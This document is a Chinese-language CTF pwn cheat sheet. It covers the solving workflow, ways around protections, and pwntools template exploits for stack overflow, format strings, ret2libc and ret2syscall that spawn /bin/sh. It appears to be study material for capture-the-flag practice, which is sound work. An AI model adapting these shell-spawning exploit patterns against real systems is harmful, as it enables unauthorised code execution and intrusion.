# Pwn 解题套路

## 通用流程

1. **checksec** - 查看保护机制
2. **file** - 识别架构（32/64位）
3. **IDA/Ghidra** - 找漏洞点和关键函数
4. **构造 payload** - 根据漏洞类型
5. **getshell 读 flag**

## 保护机制

| 保护 | 含义 | 应对 |
|------|------|------|
| NX | 栈不可执行 | ROP |
| Canary | 栈溢出检测 | 泄露/覆盖 canary |
| PIE | 地址随机化 | 泄露基址 |
| RELRO | GOT 保护 | 视情况 |

## 常见漏洞类型

### 1. 栈溢出
```python
from pwn import *

p = process('./binary')
# offset 用 cyclic 确定
payload = b'A' * offset + p64(ret_addr)
p.sendline(payload)
p.interactive()
```

**关键步骤：**
- 用 `cyclic` 找溢出偏移
- 用 `ROPgadget` 找 gadget
- 构造 ROP 链

### 2. 格式化字符串
```python
# 泄露栈
payload = b'%p.' * 20
# 写入（任意地址写）
payload = b'%XXc%YY$n'
```

**要点：**
- 找到格式化字符串参数在栈上的偏移
- 用 `%n` 写入，`%p` 泄露

### 3. 堆利用
- Use After Free (UAF)
- Double Free
- 堆溢出
- 常见：fastbin attack, unsorted bin attack, tcache attack

### 4. 整数溢出
- 有符号/无符号转换
- `int` 溢出回绕

## ROP 构造

### ret2text（有后门函数）
```python
payload = b'A' * offset + p64(backdoor_addr)
```

### ret2libc（无后门，泄露 libc）
```python
# 1. 泄露 libc 地址
payload1 = b'A' * offset + p64(puts_plt) + p64(main_addr)
# 2. 计算体系
libc.address = leaked_puts - libc.symbols['puts']
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
# 3. getshell
payload2 = b'A' * offset + p64(system) + p64(0) + p64(binsh)
```

### ret2syscall
```python
# 32位，调用 execve("/bin/sh", 0, 0)
pop_eax = 0x...
pop_ebx_ecx_edx = 0x...
int_0x80 = 0x...
payload = b'A' * offset + p32(pop_eax) + p32(0xb) + p32(pop_ebx_ecx_edx) + p32(binsh_addr) + p32(0) + p32(0) + p32(int_0x80)
```

## 常用工具

```bash
checksec binary         # 保护机制
ROPgadget --binary binary  # 找 gadget
one_gadget libc.so      # 找 one_gadget
pwntools                # Python 编写 exploit
```

## 解题流程

1. `checksec` + `file` 了解目标
2. IDA 找漏洞点和可用函数
3. 确定攻击路径（ret2text/ret2libc/...）
4. pwntools 写 exploit
5. 本地测试通过后打远程
6. `cat /flag` 获取 flag

## 注意事项

- 远程题目用 `remote(host, port)`
- 注意 32/64 位差异（`p32` vs `p64`）
- 堆题多看源码和分配/释放顺序
- 注意大小端
